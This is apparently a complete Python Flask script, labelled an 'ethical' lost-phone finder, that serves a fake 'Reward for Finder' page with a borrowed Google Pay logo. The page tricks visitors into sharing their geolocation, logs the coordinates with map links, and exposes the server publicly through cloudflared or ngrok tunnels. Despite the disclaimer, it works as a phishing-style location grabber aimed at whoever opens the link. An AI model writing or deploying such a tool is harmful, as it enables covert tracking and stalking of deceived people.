#!/usr/bin/env python3
"""
HCO-Phone-Finder v2 - Ethical Edition
By Azhar | Hackers Colony Tech
Use only to locate your own lost phone.
"""

import os, sys, subprocess, json, csv, time, requests
from flask import Flask, request, render_template_string
from datetime import datetime

app = Flask(__name__)

# ------------------ HTML/CSS/JS ------------------
HTML = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Reward for Finder</title>
  <style>
    body{font-family:'Segoe UI',sans-serif;background:#111;color:#fff;
    display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
    .card{background:#1e1e1e;padding:2rem;border-radius:1rem;text-align:center;
    box-shadow:0 0 20px #0ff;width:90%;max-width:360px;}
    .logo{width:100px;margin-bottom:1rem;}
    button{background:#0ff;border:none;color:#111;font-weight:bold;padding:1rem 1.5rem;
    border-radius:.5rem;cursor:pointer;font-size:1rem;}
    button:hover{background:#0cc;}
    #msg{margin-top:1rem;color:#0f0;}
  </style>
</head>
<body>
  <div class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_Pay_logo.svg" class="logo"/>
    <h2>Reward for Finder 🎁</h2>
    <p>If you found this phone, please help return it to its owner.</p>
    <p>You’ll receive a small <b>thank-you reward</b> once verified!</p>
    <button id="shareBtn">Share Location to Claim</button>
    <p id="msg"></p>
  </div>
  <script>
    const btn=document.getElementById('shareBtn');
    const msg=document.getElementById('msg');
    btn.onclick=()=>{
      msg.textContent='Requesting location...';
      if(!navigator.geolocation){msg.textContent='Geolocation not supported.';return;}
      navigator.geolocation.getCurrentPosition(pos=>{
        msg.textContent='Thank you! Reward verification in progress...';
        fetch('/report',{method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify({
            latitude:pos.coords.latitude,
            longitude:pos.coords.longitude,
            accuracy:pos.coords.accuracy,
            timestamp:Date.now()
          })
        });
      },err=>{msg.textContent='Permission denied or error.';});
    };
  </script>
</body>
</html>"""

# ------------------ Flask routes ------------------
@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/report", methods=["POST"])
def report():
    data=request.get_json(force=True)
    lat=data.get("latitude"); lon=data.get("longitude")
    acc=data.get("accuracy"); ts=int(data.get("timestamp",time.time()))
    stamp=datetime.fromtimestamp(ts/1000 if ts>1e12 else ts).isoformat()
    row=[stamp,lat,lon,acc]
    with open("reports.csv","a",newline="") as f:
        csv.writer(f).writerow(row)
    link=f"https://maps.google.com/?q={lat},{lon}"
    print(f"\n📍 Location received at {stamp}\n   → {link}\n   Accuracy ±{acc} m\n")
    sys.stdout.flush()
    return {"status":"ok"}

# ------------------ Tunnel helper ------------------
def start_tunnel(tool):
    if tool=="1":
        print("\n[+] Starting cloudflared tunnel ...")
        try:
            proc=subprocess.Popen(["cloudflared","tunnel","--url","http://127.0.0.1:5000"],
                                   stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            time.sleep(5)
            for line in proc.stderr:
                if b"https://" in line:
                    url=line.decode().split(" ")[-1].strip()
                    return url
        except Exception as e:
            print("Cloudflared failed:",e)
    elif tool=="2":
        print("\n[+] Starting ngrok tunnel ...")
        subprocess.Popen(["ngrok","http","5000"])
        time.sleep(5)
        try:
            r=requests.get("http://127.0.0.1:4040/api/tunnels")
            url=r.json()["tunnels"][0]["public_url"]
            return url
        except Exception as e:
            print("Ngrok API not responding:",e)
    return None

# ------------------ Main ------------------
if __name__=="__main__":
    print("╔════════════════════════════════╗")
    print("║       HCO-Phone-Finder v2      ║")
    print("╚════════════════════════════════╝")
    print("Code by Azhar | Hackers Colony Tech\n")
    print("1) Cloudflared (recommended)\n2) Ngrok\n")
    choice=input("Choose tunnel (1/2): ").strip()
    url=start_tunnel(choice)
    if not url:
        url="http://127.0.0.1:5000"
        print("[!] Tunnel not detected; using local link.")
    print(f"\n[+] Public Link: {url}\n")
    app.run(host="0.0.0.0", port=5000)
